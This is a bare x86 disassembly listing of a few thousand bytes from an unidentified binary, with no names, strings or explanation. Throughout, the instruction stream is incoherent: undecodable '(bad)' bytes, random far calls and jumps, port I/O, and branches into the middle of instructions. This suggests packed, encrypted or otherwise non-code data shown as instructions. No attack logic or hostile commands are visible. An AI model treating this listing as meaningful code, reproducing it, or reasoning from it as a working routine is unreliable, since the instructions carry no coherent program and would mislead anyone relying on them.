  413ad6:	pop    esi
  413ad7:	mov    esi,0x261b44e2
  413adc:	jb     0x413ad3
  413ade:	je     0x413aab
  413ae0:	mov    ds:0x1541a319,al
  413ae5:	xor    ah,ch
  413ae7:	mov    dh,0x4f
  413ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aea:	nop
  413aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aec:	or     DWORD PTR [edi-0x75],edi
  413aef:	repnz call 0x4441:0x3d5a1300
  413af7:	lahf   
  413af8:	fadd   QWORD PTR [edi-0x1c602b53]
  413afe:	pop    es
  413aff:	call   0xae2c:0x9527e53c
  413b06:	call   0xe87:0x8da686c
  413b0d:	stos   BYTE PTR es:[edi],al
  413b0e:	int3   
  413b0f:	cwde   
  413b10:	and    edi,edi
  413b12:	popa   
  413b13:	and    eax,0xfefb31f5
  413b18:	adc    eax,0xae821d08
  413b1d:	adc    ebp,edx
  413b1f:	mov    al,ds:0x1daae63a
  413b24:	sbb    DWORD PTR [edi],esi
  413b26:	push   ebp
  413b27:	rcl    DWORD PTR [esi-0x5ff0ffff],cl
  413b2d:	std    
  413b2e:	pop    ds
  413b2f:	shr    DWORD PTR [esi],1
  413b31:	push   edi
  413b32:	cmp    eax,eax
  413b34:	ret    0xc88f
  413b37:	mov    esp,0xb1f724d4
  413b3c:	mov    eax,0xc2bbe746
  413b41:	in     eax,dx
  413b42:	addr16 js 0x413bb2
  413b45:	call   0xaf89eafc
  413b4a:	sbb    edi,ebp
  413b4c:	push   0x18
  413b4e:	lds    edi,FWORD PTR [ebx+0x4c8b634]
  413b54:	sahf   
  413b55:	ret    
  413b56:	jge    0x413bb7
  413b58:	dec    ebx
  413b59:	add    dh,BYTE PTR [ebx-0x3340348]
  413b5f:	jns    0x413b0a
  413b61:	pop    esp
  413b62:	ror    DWORD PTR [eax+0x1bf8d1f5],cl
  413b68:	push   ebp
  413b69:	dec    esp
  413b6a:	fistp  DWORD PTR [ebx+0x18]
  413b6d:	xor    al,0x46
  413b6f:	ret    
  413b70:	lods   al,BYTE PTR ds:[esi]
  413b71:	mov    al,0xad
  413b73:	inc    ecx
  413b74:	and    eax,DWORD PTR ds:0x82a51644
  413b7a:	aas    
  413b7b:	cli    
  413b7c:	mov    esp,0x20661f72
  413b81:	sar    edi,1
  413b83:	xchg   ecx,eax
  413b84:	addr16 push ss
  413b86:	std    
  413b87:	(bad)
  413b8a:	gs or  ch,dl
  413b8d:	jge    0x413b9a
  413b8f:	call   0x105c4f80
  413b94:	push   es
  413b95:	xchg   edi,eax
  413b96:	mov    al,0x43
  413b98:	in     al,dx
  413b99:	add    edi,DWORD PTR [ecx-0x384aee18]
  413b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba0:	xchg   esp,eax
  413ba1:	(bad)
  413ba5:	sbb    BYTE PTR [ebx+0x59],dl
  413ba8:	inc    esp
  413ba9:	popf   
  413baa:	xor    esi,esp
  413bac:	mov    bh,BYTE PTR [eax]
  413bae:	jmp    0x6a90:0x9b3a909b
  413bb5:	adc    eax,0xae77f995
  413bba:	div    BYTE PTR [eax-0x31bd13ef]
  413bc0:	or     al,0x87
  413bc2:	bswap  ebx
  413bc4:	es pop ecx
  413bc6:	push   ecx
  413bc7:	in     al,dx
  413bc8:	jno    0x413b91
  413bca:	xchg   DWORD PTR [ecx],esi
  413bcc:	ret    0x9235
  413bcf:	sbb    eax,0x5f1ede94
  413bd4:	sub    eax,DWORD PTR [esi]
  413bd6:	inc    ebx
  413bd7:	jle    0x413c00
  413bd9:	inc    ebp
  413bda:	push   ebp
  413bdb:	xor    eax,0xb3523d20
  413be0:	mov    ah,0x8b
  413be2:	push   ds
  413be3:	lea    esi,[edi-0x54]
  413be6:	nop
  413be7:	jl     0x413b82
  413be9:	mov    ebx,0xc894d169
  413bee:	push   ss
  413bef:	jg     0x413b8e
  413bf1:	cmc    
  413bf2:	lods   eax,DWORD PTR cs:[esi]
  413bf4:	arpl   WORD PTR gs:[esi-0x5e24ba23],cx
  413bfb:	aas    
  413bfc:	das    
  413bfd:	mov    cl,BYTE PTR [esp+ecx*1+0x9]
  413c01:	or     al,BYTE PTR [ecx-0x19]
  413c04:	lds    edi,FWORD PTR [ebp+esi*4+0x1c789cb]
  413c0b:	or     BYTE PTR [ebx+0x53],bh
  413c0e:	lds    esi,FWORD PTR [eax-0xaa10d30]
  413c14:	inc    edx
  413c15:	daa    
  413c16:	mov    ?,WORD PTR [eax+0x20]
  413c19:	push   ebp
  413c1a:	aad    0x57
  413c1c:	repz sar DWORD PTR [edx],cl
  413c1f:	stos   BYTE PTR es:[edi],al
  413c20:	pop    esi
  413c21:	jl     0x413c47
  413c23:	cmp    bl,BYTE PTR [ebx+0x43e50980]
  413c29:	shr    DWORD PTR [eax-0x7c],cl
  413c2c:	nop
  413c2d:	into   
  413c2e:	(bad)  
  413c30:	ja     0x413c60
  413c32:	sahf   
  413c33:	add    dl,al
  413c35:	popf   
  413c36:	jns    0x413bd6
  413c38:	fs aaa 
  413c3a:	adc    bl,BYTE PTR [ebp+0x59]
  413c3d:	mul    cl
  413c3f:	push   cs
  413c40:	mov    eax,ds:0x739afa29
  413c45:	test   al,0x24
  413c47:	pop    edx
  413c48:	clc    
  413c49:	out    0x27,eax
  413c4b:	ret    0x784f
  413c4e:	cli    
  413c4f:	inc    esp
  413c50:	test   ecx,esi
  413c52:	fisttp QWORD PTR [ecx]
  413c54:	loopne 0x413be7
  413c56:	cli    
  413c57:	dec    ecx
  413c58:	adc    al,0xa3
  413c5a:	fucomp st(3)
  413c5c:	aad    0xff
  413c5e:	inc    ebp
  413c5f:	fisttp WORD PTR [ebx-0x48e9b370]
  413c65:	or     DWORD PTR [ecx-0x228b6a72],ecx
  413c6b:	adc    BYTE PTR [ecx+ebx*1],ch
  413c6e:	mov    ebp,edx
  413c70:	fsub   st(1),st
  413c72:	cld    
  413c73:	mov    ds:0xcf113246,eax
  413c78:	(bad)  
  413c79:	xchg   BYTE PTR gs:[eax+0x56],dl
  413c7d:	arpl   dx,sp
  413c7f:	jb     0x413cbd
  413c81:	jo     0x413cfa
  413c83:	imul   ecx,DWORD PTR [eax*8+0x7974498d],0xb
  413c8b:	cmp    dh,BYTE PTR [esi-0x2d]
  413c8e:	imul   eax,DWORD PTR [ecx+0x40f477e0],0x50
  413c95:	imul   ebx,DWORD PTR [ecx-0x3a],0xffffffdd
  413c99:	xor    dh,al
  413c9b:	and    eax,0xfca433f
  413ca0:	(bad)  
  413ca1:	mov    cl,0x34
  413ca3:	add    ch,BYTE PTR [edi+0x28006be7]
  413ca9:	pop    edx
  413caa:	add    ch,BYTE PTR [ebx+0x763a8ad]
  413cb0:	and    BYTE PTR [edx+0x51],ah
  413cb3:	cs jb  0x413c64
  413cb6:	cmp    al,0x4a
  413cb8:	xchg   DWORD PTR [ebp+esi*4+0x12],ecx
  413cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cbd:	jno    0x413c6c
  413cbf:	enter  0x75f1,0x33
  413cc3:	sub    eax,0x5238f170
  413cc8:	out    dx,al
  413cc9:	iret   
  413cca:	(bad)  
  413ccb:	int    0x5d
  413ccd:	or     eax,0xd18a6fda
  413cd2:	(bad)  
  413cd3:	ror    cl,cl
  413cd5:	add    BYTE PTR [eax],dh
  413cd7:	lahf   
  413cd8:	popf   
  413cd9:	fbstp  TBYTE PTR [edx-0xe1c4602]
  413cdf:	retf   0xc0ea
  413ce2:	fucom  st(1)
  413ce4:	lahf   
  413ce5:	sbb    eax,DWORD PTR [esi+0xbec4b28]
  413ceb:	stos   DWORD PTR es:[edi],eax
  413cec:	adc    BYTE PTR [ebp+0x10],cl
  413cef:	mov    esp,0xc0dbb7d7
  413cf4:	jecxz  0x413c93
  413cf6:	lock pushf 
  413cf8:	pusha  
  413cf9:	arpl   WORD PTR [edx],bx
  413cfb:	mov    DWORD PTR [eax-0x79],ecx
  413cfe:	sub    BYTE PTR [ebx-0x2],cl
  413d01:	mov    bl,0x44
  413d03:	ss pop ebp
  413d05:	xor    DWORD PTR [bp+si],edx
  413d08:	cmp    eax,0x93a9dfb4
  413d0d:	loopne 0x413d1f
  413d0f:	test   DWORD PTR [edi+0x6],edi
  413d12:	lods   al,BYTE PTR ds:[esi]
  413d13:	stos   DWORD PTR es:[edi],eax
  413d14:	add    esi,DWORD PTR [eax+0x72a30277]
  413d1a:	mov    bl,0xd5
  413d1c:	popa   
  413d1d:	or     BYTE PTR [ecx-0x756b32f4],al
  413d23:	xor    al,0x62
  413d25:	jbe    0x413ccc
  413d27:	mov    eax,ds:0xd799724
  413d2c:	dec    ebx
  413d2d:	add    al,0xfe
  413d2f:	jbe    0x413ce7
  413d31:	stos   DWORD PTR es:[edi],eax
  413d32:	fistp  DWORD PTR [edx+edx*8+0x15833653]
  413d39:	dec    ebp
  413d3a:	or     esp,DWORD PTR [edi-0x3c]
  413d3d:	sub    eax,0x7e1ea103
  413d42:	mov    ds:0x30c2b5f4,eax
  413d47:	imul   edi,ebx,0x27
  413d4a:	mov    DWORD PTR [esi],edx
  413d4c:	das    
  413d4d:	fsubr  st(7),st
  413d4f:	aaa    
  413d50:	xlat   BYTE PTR ds:[ebx]
  413d51:	rcr    BYTE PTR [ecx+eiz*4],cl
  413d54:	and    al,0xf1
  413d56:	ins    DWORD PTR es:[edi],dx
  413d57:	and    edx,esi
  413d59:	aam    0xbb
  413d5b:	pop    ebp
  413d5c:	mov    ah,0x48
  413d5e:	jge    0x413daa
  413d60:	and    eax,0xdc2a236b
  413d65:	nop
  413d66:	(bad)
  413d6a:	adc    BYTE PTR [edx+0x7f],dh
  413d6d:	ja     0x413d25
  413d6f:	imul   esi,DWORD PTR [edx],0x1a
  413d72:	inc    eax
  413d73:	popf   
  413d74:	or     ecx,DWORD PTR [ebx+0xd]
  413d77:	push   esp
  413d78:	retf   
  413d79:	add    al,0x45
  413d7b:	pop    ebp
  413d7c:	mov    al,BYTE PTR [eax-0x1a]
  413d7f:	cmp    BYTE PTR [esi],dh
  413d81:	or     BYTE PTR [edi],0x9d
  413d84:	xchg   esp,eax
  413d85:	in     al,dx
  413d86:	repz cmp DWORD PTR [esi-0x7a],ebx
  413d8a:	pop    esi
  413d8b:	repz (bad) 
  413d8d:	outs   dx,DWORD PTR fs:[esi]
  413d8f:	jmp    0x413df3
  413d91:	xor    eax,0x81d1065a
  413d96:	dec    edx
  413d97:	cld    
  413d98:	loopne 0x413d74
  413d9a:	shl    bh,1
  413d9c:	add    ecx,ebp
  413d9e:	scas   al,BYTE PTR es:[edi]
  413d9f:	stos   BYTE PTR es:[edi],al
  413da0:	sar    DWORD PTR [esp+edi*2-0x21],cl
  413da4:	or     bh,BYTE PTR [edx-0x5d]
  413da7:	scas   al,BYTE PTR es:[edi]
  413da8:	add    BYTE PTR [ebx+0x47b38992],bl
  413dae:	rcr    BYTE PTR [edi+0x53],cl
  413db1:	mov    al,ds:0x830a5261
  413db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413db7:	jno    0x413e03
  413db9:	jnp    0x413ddd
  413dbb:	jne    0x413e03
  413dbd:	int    0x5e
  413dbf:	dec    edx
  413dc0:	repz shl BYTE PTR [eax+ebp*2],cl
  413dc4:	push   edi
  413dc5:	lea    ecx,[esi]
  413dc7:	mov    dh,0xb6
  413dc9:	xor    bl,cl
  413dcb:	adc    ebp,DWORD PTR [edi-0x78]
  413dce:	push   0x72
  413dd0:	not    BYTE PTR [ebx-0x5d]
  413dd3:	aam    0x7f
  413dd5:	retf   
  413dd6:	call   0x8d47:0x768bd40b
  413ddd:	cld    
  413dde:	fimul  WORD PTR [eax-0x24]
  413de1:	adc    DWORD PTR [edi-0x796aa9c1],esi
  413de7:	and    bh,BYTE PTR [ebp-0x59]
  413dea:	cmp    DWORD PTR [ecx-0x29],ebp
  413ded:	inc    edx
  413dee:	sub    eax,0x77abf615
  413df3:	push   esp
  413df4:	xchg   ebp,eax
  413df5:	push   ebp
  413df6:	add    eax,0x525e7a82
  413dfb:	inc    ecx
  413dfc:	sub    eax,DWORD PTR [edi-0x98171f9]
  413e02:	jne    0x413e38
  413e04:	arpl   WORD PTR [ecx+0xf2afaeb],dx
  413e0a:	jo     0x413e09
  413e0c:	sahf   
  413e0d:	rol    esi,cl
  413e0f:	sbb    al,0x23
  413e11:	leave  
  413e12:	xor    edi,ecx
  413e14:	jle    0x413de0
  413e16:	adc    BYTE PTR [ecx-0x39],cl
  413e19:	pop    eax
  413e1a:	(bad)  
  413e1b:	cmp    dl,BYTE PTR [edx+eax*8+0x4efb1aff]
  413e22:	ds mov ecx,0xcdd87138
  413e28:	mov    dl,0x5d
  413e2a:	(bad)  
  413e2c:	in     eax,0x65
  413e2e:	test   ebp,eax
  413e30:	mov    eax,0x41da162b
  413e35:	cdq    
  413e36:	out    0xe6,al
  413e38:	lods   eax,DWORD PTR ds:[esi]
  413e39:	arpl   sp,bx
  413e3b:	push   cs
  413e3c:	sahf   
  413e3d:	in     eax,0xcc
  413e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e40:	jmp    0xeff9a3e
  413e45:	cmp    eax,0xe4b9415d
  413e4a:	add    eax,DWORD PTR [ecx-0x30]
  413e4d:	inc    ebx
  413e4e:	push   ds
  413e4f:	lds    ebp,FWORD PTR [ecx]
  413e51:	push   ss
  413e52:	or     BYTE PTR [ebx],ch
  413e54:	push   ecx
  413e55:	dec    BYTE PTR [ecx-0x5a]
  413e58:	inc    ebx
  413e59:	push   es
  413e5a:	dec    eax
  413e5b:	out    dx,eax
  413e5c:	imul   edx,DWORD PTR [ebx-0x2c],0xd7d67586
  413e63:	or     edx,DWORD PTR [esi+0x1b]
  413e66:	rol    BYTE PTR [edi-0x25ec689e],cl
  413e6c:	rcr    DWORD PTR [esi+0x48c277e0],cl
  413e72:	xor    ch,BYTE PTR [edx+0x63f56d9e]
  413e78:	sub    BYTE PTR [eax+edi*4-0xd],bl
  413e7c:	(bad)  
  413e7d:	mov    ecx,0xac77695
  413e82:	mov    ebp,cs
  413e84:	pop    esp
  413e85:	inc    eax
  413e86:	ret    
  413e87:	pop    esp
  413e88:	daa    
  413e89:	inc    edx
  413e8a:	adc    al,0xda
  413e8c:	sbb    edx,DWORD PTR [ebx+0x7e0142e7]
  413e92:	or     edx,ebx
  413e94:	sbb    al,bl
  413e96:	or     eax,0x3767c7dd
  413e9b:	cmp    eax,0xa6c19909
  413ea0:	mov    bh,0x3d
  413ea2:	call   0xe52107f6
  413ea7:	rcl    DWORD PTR [ebp-0x51],0x27
  413eab:	dec    eax
  413eac:	and    DWORD PTR [esi-0x7e],esi
  413eaf:	loope  0x413e88
  413eb1:	adc    esp,esp
  413eb3:	mov    ch,0x91
  413eb5:	scas   al,BYTE PTR es:[edi]
  413eb6:	clc    
  413eb7:	mov    DWORD PTR [edi+edi*1-0xc],ecx
  413ebb:	loope  0x413edc
  413ebd:	xor    edx,DWORD PTR [edx+0x31]
  413ec0:	outs   dx,BYTE PTR ds:[esi]
  413ec1:	pop    ebp
  413ec2:	pop    es
  413ec3:	push   0x71
  413ec5:	cmp    edx,DWORD PTR [edi-0x3bfc72bf]
  413ecb:	dec    DWORD PTR [edx+0x63]
  413ece:	and    BYTE PTR [edx+0x35],bl
  413ed1:	sub    bh,BYTE PTR [ebx-0x27d919f8]
  413ed7:	push   0x36382ee7
  413edc:	rcl    DWORD PTR [esi+0x42916401],1
  413ee2:	mov    cl,0xb5
  413ee4:	xchg   ecx,eax
  413ee5:	retf   
  413ee6:	leave  
  413ee7:	pop    ebx
  413ee8:	cs es inc eax
  413eeb:	xor    ah,ah
  413eed:	xor    al,0x3d
  413eef:	dec    eax
  413ef0:	rol    BYTE PTR [edx],1
  413ef2:	loopne 0x413e9e
  413ef4:	mov    ch,0xe1
  413ef6:	mov    ah,0xe6
  413ef8:	inc    esp
  413ef9:	adc    eax,0x1a8c91b1
  413efe:	mul    dl
  413f00:	mov    esp,0xfd355bd0
  413f05:	imul   ebp,DWORD PTR [esi-0x5f326552],0x54
  413f0c:	out    0xa0,al
  413f0e:	xor    BYTE PTR [ecx+0x53],bh
  413f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f12:	sub    eax,0x7c1f5806
  413f17:	cs pusha 
  413f19:	repnz cli 
  413f1b:	adc    BYTE PTR [esi],0x22
  413f1e:	ss or  dh,ch
  413f21:	and    BYTE PTR [edi+esi*4+0x61],dh
  413f25:	rol    DWORD PTR [edx],1
  413f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f28:	loop   0x413f7f
  413f2a:	sbb    al,0x13
  413f2c:	in     al,dx
  413f2d:	(bad)  
  413f2e:	add    BYTE PTR [eax],bl
  413f30:	jae    0x413f98
  413f32:	(bad)  
  413f33:	fmul   DWORD PTR [edx-0x36c9919]
  413f39:	cs (bad) 
  413f3b:	and    dh,BYTE PTR [esi+eiz*1+0x162f3da0]
  413f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f43:	dec    ebp
  413f44:	sub    ch,ah
  413f46:	inc    eax
  413f47:	jl     0x413faf
  413f49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f4a:	dec    edx
  413f4b:	pusha  
  413f4c:	test   DWORD PTR [edi],edx
  413f4e:	cmp    esp,edi
  413f50:	dec    edi
  413f51:	shl    BYTE PTR [edx-0xf1e6d30],0xca
  413f58:	retf   
  413f59:	in     eax,dx
  413f5a:	mov    ah,0xe9
  413f5c:	sbb    DWORD PTR [edx],ebx
  413f5e:	sahf   
  413f5f:	in     al,0xb9
  413f61:	mov    ebx,DWORD PTR [edi+0x309730cb]
  413f67:	sar    DWORD PTR [ecx-0x6e7b233f],1
  413f6d:	gs pushf 
  413f6f:	push   cs
  413f70:	mov    ecx,0x920646f2
  413f75:	mov    bl,0x1b
  413f77:	ins    DWORD PTR es:[edi],dx
  413f78:	adc    dh,0x49
  413f7b:	push   edx
  413f7c:	cmp    BYTE PTR [edi-0x71f60b0d],dh
  413f82:	inc    esi
  413f83:	adc    eax,0x3e61adb6
  413f88:	mov    DWORD PTR [eax+edi*1-0x11564ec7],edi
  413f8f:	add    BYTE PTR [edx+0x48fbfb7f],0xd3
  413f96:	mov    esi,ebp
  413f98:	inc    edi
  413f99:	or     al,0x8a
  413f9b:	xchg   esp,eax
  413f9c:	adc    DWORD PTR [edi-0x4bee526e],edi
  413fa2:	(bad)  
  413fa3:	hlt    
  413fa4:	shr    DWORD PTR [esi-0x46],0x74
  413fa8:	loop   0x414029
  413faa:	inc    edi
  413fab:	sbb    ebx,DWORD PTR [eax+0x36]
  413fae:	hlt    
  413faf:	aam    0x5b
  413fb1:	sbb    edi,eax
  413fb3:	(bad)  
  413fb4:	in     al,0x6b
  413fb6:	js     0x413fe5
  413fb8:	xchg   edi,eax
  413fb9:	shl    BYTE PTR [ecx+ecx*2-0x345b8a48],0x77
  413fc1:	sahf   
  413fc2:	lods   eax,DWORD PTR ds:[esi]
  413fc3:	push   es
  413fc4:	and    al,0x3c
  413fc6:	fadd   DWORD PTR [eax+0x2a55f552]
  413fcc:	aam    0xe5
  413fce:	and    al,0xd8
  413fd0:	cmp    al,0x6d
  413fd2:	aas    
  413fd3:	and    DWORD PTR [esi-0x65],0x937691b
  413fda:	jmp    0x90178b01
  413fdf:	push   cs
  413fe0:	inc    esp
  413fe1:	add    ecx,DWORD PTR [edi]
  413fe3:	add    DWORD PTR [esp+ebx*1],edi
  413fe6:	sbb    DWORD PTR [eax-0x57],ecx
  413fe9:	xchg   ebx,eax
  413fea:	(bad)  
  413feb:	jp     0x413fc1
  413fed:	adc    DWORD PTR [edx+0x1c087960],esp
  413ff3:	es mov ebp,0x4e98476b
  413ff9:	bnd jno 0x414011
  413ffc:	sub    BYTE PTR [edx-0x48],al
  413fff:	jmp    0x8fcff13e
  414004:	dec    ecx
  414005:	fcmovnb st,st(4)
  414007:	mov    DWORD PTR [edx],0x805d7d1c
  41400d:	sahf   
  41400e:	mov    ds:0x3ad2c98c,eax
  414013:	mov    al,0xb8
  414015:	and    bh,BYTE PTR [ebx]
  414017:	lods   al,BYTE PTR ds:[esi]
  414018:	(bad)  
  414019:	push   ebp
  41401a:	mov    al,ds:0x56bc14a9
  41401f:	sub    BYTE PTR [eax+0x76],cl
  414022:	std    
  414023:	sub    eax,0x58e55fe2
  414028:	test   bl,0x33
  41402b:	pop    ecx
  41402c:	sub    ah,BYTE PTR ds:0x26c0502a
  414032:	jbe    0x414019
  414034:	and    ebp,DWORD PTR [eax-0x75251984]
  41403a:	retf   0x5e28
  41403d:	mov    ds:0xecb75784,eax
  414042:	(bad)  
  414043:	add    edi,esp
  414045:	jns    0x414081
  414047:	jo     0x4140ae
  414049:	fsubr  st(1),st
  41404b:	leave  
  41404c:	imul   ebx,DWORD PTR [edx-0x68],0x942d2cb7
  414053:	jmp    0x413fde
  414055:	xor    bh,bh
  414057:	in     al,0x46
  414059:	popa   
  41405a:	xor    dh,BYTE PTR [edx-0x242c0092]
  414060:	mov    ds:0x4969f90a,eax
  414065:	jns    0x413fe7
  414067:	inc    esp
  414068:	cdq    
  414069:	mov    WORD PTR [eax],fs
  41406b:	in     eax,dx
  41406c:	and    bl,BYTE PTR [eax]
  41406e:	cs xchg edx,eax
  414070:	and    al,0x2c
  414072:	leave  
  414073:	adc    BYTE PTR [esp+edi*8+0x58733d7a],0x85
  41407b:	dec    ecx
  41407c:	clc    
  41407d:	mov    esi,0x71aaeadb
  414082:	cwde   
  414083:	mov    bl,0xe6
  414085:	add    esi,esp
  414087:	icebp  
  414088:	outs   dx,BYTE PTR ds:[esi]
  414089:	push   edx
  41408a:	fbld   TBYTE PTR [ebx-0x3d]
  41408d:	jmp    0x4140f8
  41408f:	mov    DWORD PTR [ebp+0x2ab4ecb],0x99e5db4b
  414099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41409a:	dec    ecx
  41409b:	mov    cl,0x6b
  41409d:	cmp    al,dh
  41409f:	dec    esp
  4140a0:	imul   ebp,DWORD PTR [ebx-0x1e868c53],0x96099445
  4140aa:	neg    DWORD PTR ds:0x6e3e1b48
  4140b0:	adc    BYTE PTR [edi],0xdf
  4140b3:	out    dx,al
  4140b4:	shr    ebp,0x34
  4140b7:	pop    DWORD PTR [edx+0x14]
  4140ba:	mov    ah,0x19
  4140bc:	out    dx,eax
  4140bd:	or     edi,DWORD PTR [ebx-0x8]
  4140c0:	sub    DWORD PTR [esi],ecx
  4140c2:	mov    ds:0x88a36cdd,eax
  4140c7:	icebp  
  4140c8:	retf   
  4140c9:	inc    ebp
  4140ca:	in     eax,0x96
  4140cc:	fidivr WORD PTR [ecx]
  4140ce:	ds dec ebp
  4140d0:	sbb    dl,BYTE PTR cs:[esp+ecx*4+0x18763a90]
  4140d8:	imul   esi,DWORD PTR [ebx+0x43378dd7],0xa05c45
  4140e2:	mov    bl,0xfb
  4140e4:	aad    0xf3
  4140e6:	inc    esp
  4140e7:	xchg   DWORD PTR [edi-0x71313953],ecx
  4140ed:	add    ecx,DWORD PTR [ebx]
  4140ef:	jle    0x4140ef
  4140f1:	or     al,0xc
  4140f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f4:	or     BYTE PTR [ebx+0x69],ch
  4140f7:	leave  
  4140f8:	xor    ebx,esi
  4140fa:	lahf   
  4140fb:	(bad)  
  4140fc:	pop    eax
  4140fd:	clc    
  4140fe:	jmp    0xb26ac4a
  414103:	xor    ah,BYTE PTR [eax+0x1174f54d]
  414109:	mov    ch,0xf
  41410b:	inc    esp
  41410c:	jl     0x41412b
  41410e:	cmp    dl,BYTE PTR [edx]
  414110:	imul   ebp,edx,0x1cb39165
  414116:	pushf  
  414117:	cmp    al,0x0
  414119:	ins    DWORD PTR es:[edi],dx
  41411a:	add    BYTE PTR [eax-0x37741ed2],0xae
  414121:	retf   
  414122:	pop    edi
  414123:	sbb    BYTE PTR [ebx],dl
  414125:	out    0x59,eax
  414127:	scas   eax,DWORD PTR es:[edi]
  414128:	mov    ds:0x78de6068,eax
  41412d:	pop    ds
  41412e:	and    DWORD PTR [ecx-0x498ecc9b],0xffffffdd
  414135:	leave  
  414136:	lock cmp al,BYTE PTR [edi]
  414139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41413a:	jbe    0x41411d
  41413c:	cs cmp eax,0x7c1df819
  414142:	sub    DWORD PTR [edx+0x2ac855c6],esi
  414148:	mov    ebx,0xcaad4c3f
  41414d:	add    eax,0xb38cbaf
  414152:	cmp    al,0x42
  414154:	pop    esi
  414155:	adc    ebx,0xd9a84c26
  41415b:	loopne 0x41418c
  41415d:	outs   dx,BYTE PTR ds:[esi]
  41415e:	std    
  41415f:	add    ebx,DWORD PTR [eax+0x35059359]
  414165:	inc    edi
  414166:	dec    edi
  414167:	clc    
  414168:	test   eax,0x78ce29e0
  41416d:	xor    bl,BYTE PTR [ebp+0x1b]
  414170:	ins    DWORD PTR es:[edi],dx
  414171:	ret    0x2f1f
  414174:	std    
  414175:	sbb    bh,BYTE PTR [ecx+0x3b]
  414178:	mov    ebp,0xcb962593
  41417d:	repnz seta BYTE PTR [ebp-0x5a]
  414182:	bound  edi,QWORD PTR [ebp-0x531fbcff]
  414188:	rol    DWORD PTR [ebx],1
  41418a:	ins    DWORD PTR es:[edi],dx
  41418b:	pusha  
  41418c:	sub    eax,eax
  41418e:	fsubr  QWORD PTR [esi]
  414190:	xchg   esp,eax
  414191:	sbb    dh,BYTE PTR [ecx]
  414193:	inc    edi
  414194:	adc    DWORD PTR [ebx+esi*4-0x36c784e],0x931cf171
  41419f:	ret    
  4141a0:	(bad)  [ebp-0x18e7233f]
  4141a6:	sub    ch,BYTE PTR [edi]
  4141a8:	stc    
  4141a9:	inc    edx
  4141aa:	pop    ds
  4141ab:	fcomp  DWORD PTR [esi+edx*8-0x4f]
  4141af:	shl    BYTE PTR [esi-0x18],1
  4141b2:	mov    edx,0xb74cfd3d
  4141b7:	scas   al,BYTE PTR es:[edi]
  4141b8:	cmp    eax,0x59e9428b
  4141bd:	fwait
  4141be:	cmp    edx,esi
  4141c0:	xor    eax,0x277dd84e
  4141c5:	mov    ah,0xe5
  4141c7:	cmp    al,0xc9
  4141c9:	out    dx,al
  4141ca:	fs loope 0x414219
  4141cd:	add    DWORD PTR [esp+eax*1],edx
  4141d0:	fnstsw WORD PTR [ebx+edx*1+0x6d]
  4141d4:	pop    edx
  4141d5:	mov    al,ds:0xfb4565a2
  4141da:	mov    WORD PTR [ebp-0x71f6aeed],gs
  4141e0:	push   ecx
  4141e1:	cmp    DWORD PTR [esi],ecx
  4141e3:	sti    
  4141e4:	fwait
  4141e5:	mov    dl,0x5a
  4141e7:	(bad)  
  4141e8:	jmp    0x5d91:0xe7223281
  4141ef:	lock cmp BYTE PTR [ebp-0x678e4196],cl
  4141f6:	and    DWORD PTR [ecx],edx
  4141f8:	cmp    DWORD PTR [edx],0x43c9c583
  4141fe:	cdq    
  4141ff:	adc    DWORD PTR [esi-0x34],edi
  414202:	dec    ebp
  414203:	je     0x414199
  414205:	xchg   edx,eax
  414206:	cmp    BYTE PTR [esp+ebx*1+0x4676281d],ch
  41420d:	inc    ecx
  41420e:	mov    bl,BYTE PTR [ebp-0x74]
  414211:	add    ebx,DWORD PTR [ecx+0x79bcd209]
  414217:	das    
  414218:	repnz (bad) 
  41421a:	jmp    0x1d8d:0xa1ce1900
  414221:	mov    WORD PTR [edx-0x59],fs
  414224:	mov    ebp,0x7f2ce90b
  414229:	mov    dh,0x1c
  41422b:	cli    
  41422c:	jecxz  0x4142a2
  41422e:	pushf  
  41422f:	cmc    
  414230:	cmc    
  414231:	call   0x4c33:0x7dd27812
  414238:	xchg   edi,eax
  414239:	add    eax,0xd535fe28
  41423e:	sbb    ecx,edx
  414240:	fild   QWORD PTR [eax+ebp*4-0x36]
  414244:	popa   
  414245:	(bad)  
  414246:	ins    BYTE PTR es:[edi],dx
  414247:	mov    cl,0x67
  414249:	aaa    
  41424a:	in     eax,0xf
  41424c:	test   cl,cl
  41424e:	lods   al,BYTE PTR ds:[esi]
  41424f:	sub    eax,0xb74ed392
  414254:	stos   BYTE PTR es:[edi],al
  414255:	adc    esi,0x434fef7c
  41425b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41425c:	dec    ecx
  41425d:	cmp    eax,DWORD PTR [esi+0x1ff2b48c]
  414263:	mov    ebx,0xdadee83e
  414268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414269:	mov    ecx,0x6e15d486
  41426e:	imul   esi,DWORD PTR [edx],0xd84fcde3
  414274:	in     eax,dx
  414275:	into   
  414276:	aad    0xf1
  414278:	(bad)  
  414279:	lahf   
  41427a:	mov    ch,dh
  41427c:	ins    DWORD PTR es:[edi],dx
  41427d:	les    edi,FWORD PTR [eax-0x16d5fc89]
  414283:	xor    al,0xee
  414285:	push   esp
  414286:	das    
  414287:	inc    ebp
  414288:	ds jg  0x4142b3
  41428b:	into   
  41428c:	cmp    eax,0xe419a42
  414291:	mov    ecx,0xb84e21f
  414296:	push   edi
  414297:	jno    0x414294
  414299:	mov    ss,WORD PTR [ebx+0x70]
  41429c:	push   eax
  41429d:	push   ecx
  41429e:	push   edi
  41429f:	jl     0x41422d
  4142a1:	add    cl,bh
  4142a3:	add    eax,ecx
  4142a5:	sub    edx,ebp
  4142a7:	cmp    dl,BYTE PTR [ebx+0x7663945a]
  4142ad:	leave  
  4142ae:	cmp    ebx,ecx
  4142b0:	loop   0x414260
  4142b2:	rcl    BYTE PTR [esi+0x1a81d7b9],0x93
